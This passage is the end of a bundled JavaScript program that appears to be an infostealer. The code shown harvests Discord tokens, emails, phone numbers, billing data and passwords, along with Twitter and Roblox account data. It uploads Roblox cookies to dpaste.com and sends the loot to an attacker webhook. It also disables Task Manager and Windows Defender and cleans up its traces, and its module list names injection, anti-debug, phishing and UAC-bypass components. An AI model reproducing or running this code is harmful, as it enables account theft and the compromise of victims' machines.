    const p = await twitter.sendTwitter(config.DoINeedTo_GetSocialAPP);
    if (p) {
      await axios({
        url: webhook,
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        httpsAgent: agent,
        data: p
      });
    }
  } catch (e) {}
  var embeds = [];
  const accounts = await discord.GreySkullDiscord();
  stat.addDiscordAccount(accounts);
  //discord.WriteDiscord(stat.discordAccount[0]);
  for (let i = 0; i < stat.discordAccount[0].length && i < 3; i++) {
    var _acc$password;
    const acc = stat.discordAccount[0][i];
    if (acc.username === null || acc.username === undefined) return;
    let dscaccount = await discord.embed(acc.username, acc.tag, acc.id, acc.nitro, acc.badges, acc.billings, acc.email, acc.phone, acc.token, acc.avatar, (_acc$password = acc.password) !== null && _acc$password !== void 0 ? _acc$password : "None");
    if (dscaccount !== null || dscaccount == undefined) {
      embeds.push(dscaccount);
    }
    const embedData = await discord.embedbis(acc.token);
    const embedguild = await discord.embedguild(acc.token);
    if (embedguild !== null && embedguild !== undefined) {
      embeds.push(embedguild);
    }
    if (embedData !== null && embedData !== undefined) {
      embeds.push(embedData);
    }
  }
  try {
    await axios({
      url: webhook,
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      httpsAgent: agent,
      data: JSON.parse(discord.compile(embeds.slice(0, 10)))
    });
  } catch (e) {}
  let allembed = [];
  try {
    const p = await roblox.sendRoblox(config.DoINeedTo_GetGames);
    if (p.length > 0) {
      allembed = await Promise.all(p.map(async pd => {
        let {
          UserName,
          RobuxBalance,
          ThumbnailUrl,
          IsAnyBuildersClubMember,
          IsPremium,
          friendscount,
          cookies
        } = pd;
        const response = await axios.post("https://dpaste.com/api/", `content=${encodeURIComponent(cookies)}`, {
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          }
        });
        const links = response.headers.location;
        return roblox.embed(UserName, RobuxBalance, ThumbnailUrl, IsAnyBuildersClubMember, IsPremium, friendscount, links);
      }));
      await axios({
        url: webhook,
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        httpsAgent: agent,
        data: JSON.parse(roblox.compile(allembed.slice(0, 10)))
      });
    }
  } catch (e) {}
  await minecraft.GreySkullfinduid(webhook, config.DoINeedTo_GetGames);
  core.GreySkullDisabTaskMNGR(config.DoINeedTo_DisableUSERSET);
  core.GreySkullDisableWinDefender(config.DoINeedTo_DisableUSERSET);

  //sound.sound(config.DoINeedTo_TrollSound);
  // imagify.spawnimage(config.DoINeedTo_TrollImage);
}
async function afterPassage() {
  await core.cleaner();
}
async function Class() {
  await start();
  console.log("class");
  await afterPassage();
  console.log("initied");
}
Class();
},{"./utils/admin":"utils/admin.js","./utils/browsers":"utils/browsers.js","./utils/core":"utils/core.js","./utils/crypto":"utils/crypto.js","./utils/discord":"utils/discord.js","./utils/files":"utils/files.js","./utils/twitter":"utils/twitter.js","./utils/uploadFiles":"utils/uploadFiles.js","./utils/infos":"utils/infos.js","./utils/injection":"utils/injection.js","./utils/antidebug":"utils/antidebug.js","./utils/save":"utils/save.js","./utils/stats":"utils/stats.js","./utils/roblox":"utils/roblox.js","./utils/minecraft":"utils/minecraft.js","./utils/phish":"utils/phish.js","./utils/reddit":"utils/reddit.js","./utils/steam":"utils/steam.js","./utils/fake_error":"utils/fake_error.js","./utils/kill":"utils/kill.js","./utils/uac":"utils/uac.js","./utils/tiktok":"utils/tiktok.js","./utils/instagram":"utils/instagram.js","./utils/cookies":"utils/cookies.js"}]},{},["index.js"], null)
//# sourceMappingURL=/script.js.map
